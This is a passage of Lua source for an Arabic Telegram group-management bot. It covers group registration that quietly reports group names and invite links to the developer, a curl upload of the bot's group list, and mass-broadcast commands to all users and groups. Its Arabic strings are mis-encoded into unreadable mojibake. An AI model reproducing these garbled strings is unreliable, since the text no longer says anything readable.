ReplyStatus(msg,result.id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© "..dp.title_)  
Devmfm:srem(mustafa.."mfm:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω β β₯‘ \nββββ EB ββββ\nβ β« Ψ¨ΩΨ§Ψ³Ψ·Ψ© β "..Name.."\nβ β« Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..NameChat.."]\nβ β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nβ¨ `"..msg.chat_id_.."` β©\nβ β« Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘\nβ¨ ["..LinkGroup.."] β©\nββββ EB ββββ\nβ β« Ψ§ΩΩΩΨͺ β "..os.date("%I:%M%p").."\nβ β« Ψ§ΩΨͺΨ§Ψ±ΩΨ? β "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source Escobar     --
if text and text:match("^Ψ§ΩΩΨ·ΩΨ±$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
if not Sudo(msg) then
SendText(DevId,"β β« ΩΩΩΨ’Ω ΩΩ Ψ¨Ψ­Ψ§Ψ¬Ω Ψ§ΩΩ ΩΨ³Ψ§ΨΉΨ―Ω β β₯‘ \nββββ EB ββββ\nβ β« Ψ§ΩΨ΄Ψ?Ψ΅ β "..Name.."\nβ β« Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..NameChat.."]\nβ β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘ \nβ¨ `"..msg.chat_id_.."` β©\nβ β« Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘\nβ¨ ["..LinkGroup.."] β©\nββββ EB ββββ\nβ β« Ψ§ΩΩΩΨͺ β "..os.date("%I:%M%p").."\nβ β« Ψ§ΩΨͺΨ§Ψ±ΩΨ? β "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source Escobar     --
if text == 'Ψ±ΩΨ§Ψ¨Ψ· Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ' or text == 'Ψ±ΩΨ§Ψ¨Ψ· Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
local List = Devmfm:smembers(mustafa.."mfm:Groups")
if #List == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ ΩΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΨΉΩΩ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ¬Ψ§Ψ±Ω Ψ§Ψ±Ψ³Ψ§Ω ΩΨ³Ψ?Ω ΨͺΨ­ΨͺΩΩ ΨΉΩΩ '..#List..' ΩΨ¬ΩΩΨΉΩ', 1, 'md')
local text = "β β« Source Escobar\nβ β« File Bot Groups\nββββ EB ββββ\n"
for k,v in pairs(List) do
local GroupsManagers = Devmfm:scard(mustafa.."mfm:Managers:"..v) or 0
local GroupsAdmins = Devmfm:scard(mustafa.."mfm:Admins:"..v) or 0
local Groupslink = Devmfm:get(mustafa.."mfm:Groups:Links" ..v)
text = text..k.." β¬ β₯‘ \nβ β« Group ID β¬ "..v.."\nβ β« Group Link β¬ "..(Groupslink or "Not Found").."\nβ β« Group Managers β¬ "..GroupsManagers.."\nβ β« Group Admins β¬ "..GroupsAdmins.."\nββββ EB ββββ\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(text)
File:close()
local abbas = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. abbas .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(curl)
end
end
end
--     Source Escobar     --
if text == "Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨ?Ψ§Ψ΅" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "β Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ β" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ³ΩΨ§Ψ‘ β β₯‘ \nβ¨ ΩΩΩ β’ ΩΩΨ΅Ω β’ ΩΨͺΨ­Ψ±ΩΩ β’ Ψ΅ΩΨ±Ω\n β’ ΩΩΩΩ°Ψ―ΩΩ β’ Ψ¨Ψ΅ΩΩ β’ Ψ΅ΩΨͺ β’ Ψ±Ψ³Ψ§ΩΩ β©\nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ ) \n β'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
List = Devmfm:smembers(mustafa..'mfm:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ±Ψ³Ψ§ΩΩ"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨ±Ω"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΨ―ΩΩ"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ¨Ψ΅ΩΩ"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨͺ"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΨ΅Ω"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© "..mfmText.." Ψ¨ΩΨ¬Ψ§Ψ­ \nβ β« βΨ§ΩΩ β β¨ "..#List.." β© ΩΨ΄ΨͺΨ±Ω \n β", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Escobar     --
if text == "Ψ§Ψ°Ψ§ΨΉΩ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "β Ψ§Ψ°Ψ§ΨΉΩ ΨΉΨ§Ω β" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ³ΩΨ§Ψ‘ β β₯‘ \nβ¨ ΩΩΩ β’ ΩΩΨ΅Ω β’ ΩΨͺΨ­Ψ±ΩΩ β’ Ψ΅ΩΨ±Ω\n β’ ΩΩΩΩ°Ψ―ΩΩ β’ Ψ¨Ψ΅ΩΩ β’ Ψ΅ΩΨͺ β’ Ψ±Ψ³Ψ§ΩΩ β©\nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ ) \n β'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
List = Devmfm:smembers(mustafa..'mfm:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ±Ψ³Ψ§ΩΩ"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨ±Ω"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΩΩ°Ψ―ΩΩ"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ¨Ψ΅ΩΩ"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨͺ"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΨ΅Ω"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© "..mfmText.." Ψ¨ΩΨ¬Ψ§Ψ­ \nβ β« βΩΩΩΩ° β β¨ "..#List.." β© ΩΨ¬ΩΩΨΉΩ \n β", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Escobar     --
if text == "Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "β Ψ§Ψ°Ψ§ΨΉΩ ΨΉΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ β" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
Devmfm:setex(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ Ψ§ΩΨ§Ω ΩΨͺΩΨ¬ΩΩΨ§ \nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ ) \n β'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local List = Devmfm:smembers(mustafa..'mfm:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© Ψ±Ψ³Ψ§ΩΨͺΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ \nβ β« βΩΩΩΩ° β β¨ "..#List.." β© ΩΨ¬ΩΩΨΉΩ \n β", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Escobar     --
if text == "Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "β Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ β" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
Devmfm:setex(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ Ψ§ΩΨ§Ω ΩΨͺΩΨ¬ΩΩΨ§ \nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ ) \n β'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local List = Devmfm:smembers(mustafa..'mfm:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© Ψ±Ψ³Ψ§ΩΨͺΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ \nβ β« βΨ§ΩΩ β β¨ "..#List.." β© ΩΨ΄ΨͺΨ±Ω \n β", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Escobar     --
if text == "Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "β Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ β" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
Devmfm:setex(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ³ΩΨ§Ψ‘ β β₯‘ \nβ¨ ΩΩΩ β’ ΩΩΨ΅Ω β’ ΩΨͺΨ­Ψ±ΩΩ β’ Ψ΅ΩΨ±Ω\n β’ ΩΩΩΩ°Ψ―ΩΩ β’ Ψ¨Ψ΅ΩΩ β’ Ψ΅ΩΨͺ β’ Ψ±Ψ³Ψ§ΩΩ β©\nβ β« ΩΩΨ?Ψ±ΩΨ¬ Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ( Ψ§ΩΨΊΨ§Ψ‘ ) \n β'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Devmfm:get(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then   
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local List = Devmfm:smembers(mustafa.."mfm:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ±Ψ³Ψ§ΩΩ"
send(v, 0,"["..msg.content_.text_.."]") 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨ±Ω"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΩΩ°Ψ―ΩΩ"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ¨Ψ΅ΩΩ"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΨ΅ΩΨͺ"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΩ"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
mfmText = "Ψ§ΩΩΩΨ΅Ω"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
Devmfm:set(mustafa..'mfm:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© "..mfmText.." Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ \nβ β« βΩΩΩΩ° β β¨ "..#List.." β© ΩΨ¬ΩΩΨΉΩ \n β", 1, 'md')
Devmfm:del(mustafa.."mfm:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--     Source Escobar     --
if text == 'Ψ­Ψ°Ω Ψ±Ψ―' and Manager(msg) and ChCheck(msg) or text == 'ΩΨ³Ψ­ Ψ±Ψ―' and  Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'DelGpRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³ΩΨ§ Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΩΩΩΩ ΩΨ­Ψ°ΩΩΨ§ " ,  1, "md")
return false
end
if text == 'Ψ§ΨΆΩ Ψ±Ψ―' and Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'SetGpRed')
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³ΩΨ§ Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SetGpRed == 'SetGpRed' then
